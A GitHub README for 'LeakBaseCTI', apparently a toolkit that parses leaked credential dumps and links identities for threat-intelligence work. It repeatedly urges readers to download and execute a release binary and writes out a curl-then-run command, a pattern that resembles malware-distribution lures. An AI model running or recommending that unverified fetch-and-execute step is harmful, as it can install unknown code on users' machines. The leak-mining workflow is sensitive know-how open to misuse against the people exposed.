[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?logo=github&logoColor=white)](https://github.com/ZanetaoBroos/LeakBaseCTI/releases) https://github.com/ZanetaoBroos/LeakBaseCTI/releases

# LeakBaseCTI — OSINT Investigator Toolkit for LeakBase Backups

![OSINT header](https://images.unsplash.com/photo-1556155092-8707de31f9c8?auto=format&fit=crop&w=1600&q=80)

A focused investigative framework for tracing malicious actors across public OSINT and LeakBase backup dumps. LeakBaseCTI combines parsing, enrichment, timeline building, and attribution tools. Use it to find patterns, link identities, and produce evidence-ready artifacts.

- Stable release and binaries: https://github.com/ZanetaoBroos/LeakBaseCTI/releases (download and execute the release file from that page)
- Status: Active maintenance
- License: MIT

Table of contents
- What LeakBaseCTI does
- Who should use this
- Key features
- Quick start (download and execute)
- Architecture and modules
- Data model and sources
- Typical workflows
- Command-line examples
- Automation and integrations
- Contributing
- License and credits
- FAQ and troubleshooting
- Changelog links

What LeakBaseCTI does
LeakBaseCTI ingests leak archives and OSINT feeds. It extracts accounts, emails, usernames, IPs, and credentials. It enriches entities with passive DNS, ASN, geolocation, and PGP key lookups. It links records into graphs and builds investigation timelines. The tool outputs reports in JSON, CSV, PDF, and STIX2 for SOC and threat intelligence use.

Who should use this
- CTI analysts who investigate data leaks and actor infrastructure
- Incident responders mapping exposed assets
- OSINT researchers focused on credential leaks and data re-use
- Abuse teams tracking repeat offenders and account clustering

Key features
- Multi-format parser: read ZIP, 7z, SQL dumps, JSONL, CSV, and raw text
- High-performance indexer for large archives
- Entity extraction: email, username, password, IP, domain, phone, PGP
- Enrichment connectors: passive DNS, Shodan, Censys, public WHOIS, and PGP keyservers
- Graph builder: link-based view with export to GraphML and GEXF
- Timeline engine: build event timelines per actor or asset
- Rule engine: write YARA-like rules to flag actor behavior
- Export: JSON, CSV, PDF, STIX2, and Elasticsearch bulk
- CLI and Python SDK for automation
- Config-driven collectors and parsers

Quick start — download and execute
Download the latest release package and run the supplied installer or binary. The release file on the releases page must be downloaded and executed for a complete install.

1) Visit the releases page and download the asset:
   https://github.com/ZanetaoBroos/LeakBaseCTI/releases

2) Linux (example)
- Download: curl -L -o LeakBaseCTI.tar.gz "https://github.com/ZanetaoBroos/LeakBaseCTI/releases/download/vX.Y/LeakBaseCTI-linux-x86_64.tar.gz"
- Extract: tar -xzf LeakBaseCTI.tar.gz
- Run: ./LeakBaseCTI/bin/leakbasecti --help

3) macOS (example)
- Download the .dmg or tarball from the releases page
- Mount or extract and run the binary inside

4) Windows (example)
- Download the .zip or .exe installer from the releases page
- Unzip and run LeakBaseCTI.exe or run the installer

If a direct download fails, check the project's Releases section on GitHub for available assets and instructions:
https://github.com/ZanetaoBroos/LeakBaseCTI/releases

Architecture and modules
- Ingest layer
  - Archive reader: streams large files without full extraction
  - Format detectors: detect SQL, JSONL, CSV, and raw dumps
- Extraction layer
  - Tokenizer: breaks text into candidate entities
  - Parsers: email, username, IP, domain, phone, PGP
- Enrichment layer
  - Connectors: REST clients for public APIs and local caches
  - Batch enrichers: perform lookups in parallel
- Linking layer
  - Graph builder: entity co-occurrence and shared metadata edges
  - Scoring: prioritize links by frequency, recency, and uniqueness
- Analysis layer
  - Timeline engine: order events and find activity spikes
  - Rule engine: detect credential reuse, cluster activity, and suspect chains
- Export layer
  - Serializers for JSON, CSV, STIX2, PDF
  - Elastic and graph export adapters
- UI/CLI
  - TUI for quick triage
  - CLI for scripted workflows
  - Python SDK for custom pipelines

Data model and sources
- Core entity types: account, email, username, password hash, IP, domain, PGP key, phone
- Relationship types: credential-use, same-hash, same-ip, co-occurred-in-leak, resolved-to-domain
- Source metadata: origin file name, archive name, timestamp, ingestion ID
- External enrichment: ASN, PTR, geolocation, passive DNS records, SSL certificate metadata, PGP key details

Typical workflows
1) Leak triage
- Ingest new dump
- Run fast extractor to list top emails and domains
- Flag high-value targets and leaked corporate domains

2) Actor attribution
- Build a graph of co-occurring emails, usernames, and IPs
- Enrich nodes with passive DNS and WHOIS
- Identify reuse of usernames across leaks and time windows

3) Credential reuse detection
- Index password hash and plaintext occurrences
- Cross-check accounts across services
- Generate prioritized notifications for account owners

4) Infrastructure tracking
- Extract IPs and domains
- Map to ASNs and certificates
- Produce IOCs and export to SIEM

Command-line examples
- Ingest an archive and run full pipeline
  leakbasecti ingest --file /data/leak-2025-06.zip --index main --full

- Extract strong indicators only
  leakbasecti extract --file /data/leak-2025-06.zip --types email,domain,ip --min-occurrences 2 --out indicators.json

- Build a graph and export to GraphML
  leakbasecti graph --index main --output graph.gexf --top 1000

- Run enrichment for a given email list
  leakbasecti enrich --input emails.txt --services passive_dns,pgp,whois --concurrency 8

- Export to STIX2
  leakbasecti export --index main --format stix2 --output stix2-report.json

Automation and integrations
- Python SDK
  - Use the SDK to build custom parsers, pipeline stages, and connectors.
  - Example:
    from leakbasecti import Client
    c = Client(api_key="xxx")
    c.ingest_file("/tmp/leak.zip")

- CI/CD
  - Add LeakBaseCTI runs to your ingestion pipeline to auto-process new drops.
  - Use the CLI in cron or GitHub Actions.

- SIEM & TIP
  - Export STIX2 bundles to your threat intel platform.
  - Push CSV/JSON to Elasticsearch or Splunk indexer.

Examples and case studies
Case: credential reuse across services
- Ingest two separate dump files from different sources.
- Extract emails and password hashes.
- Match hashes and flag accounts used on more than one service.
- Output: CSV of reused credentials and linked domains.

Case: actor infrastructure cluster
- Parse multiple dumps across six months.
- Build a co-occurrence graph of IPs and domains.
- Enrich IPs with ASN and certificate data.
- Identify a small set of domains that service multiple actor clusters.

Best practice notes
- Run enrichment in batches to avoid API rate limits.
- Deduplicate entities at ingest to save disk space.
- Use snapshotting for large archives so you can resume tasks.

Contributing
- Fork the repo and create a feature branch
- Write tests for new parsers or connectors
- Follow the coding style in CONTRIBUTING.md
- Open a pull request with a clear description and sample data when available

Code of use
- Operate the tool within your local laws and organization policies.
- Use proper authorization when accessing third-party assets.

License and credits
- License: MIT
- Major libraries used:
  - fastparse (custom tokenizer)
  - networkx (graph export)
  - requests (HTTP enrichment)
  - python-stix2 (STIX output)
- Design and maintenance by the core team and community contributors

FAQ and troubleshooting
Q: Where do I get binaries and installers?
A: Visit the releases page and download the appropriate asset. The release file must be downloaded and executed to install or run the software:
https://github.com/ZanetaoBroos/LeakBaseCTI/releases

Q: I see memory spikes on large archives. What helps?
A: Use the streaming ingest mode and set --chunk-size to a lower value. Enable on-disk indexing.

Q: How do I add a new enrichment service?
A: Implement a connector class in src/enrich/connectors and register it in enrich.yaml. Follow the connector template in docs/connectors.md.

Q: How do I report false positives?
A: Open an issue with sample data and the rule or query that triggered the result.

Changelog and releases
- Check release notes, signed assets, and release hashes on the Releases page:
https://github.com/ZanetaoBroos/LeakBaseCTI/releases

Resources and references
- STIX2 spec: https://oasis-open.github.io/cti-documentation/
- Passive DNS providers: public APIs and dataset docs
- PGP keyserver docs

Contact and support
- Open issues on GitHub for bugs and feature requests
- Submit pull requests for fixes and new features

Badges
[![Download Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&logoColor=white)](https://github.com/ZanetaoBroos/LeakBaseCTI/releases)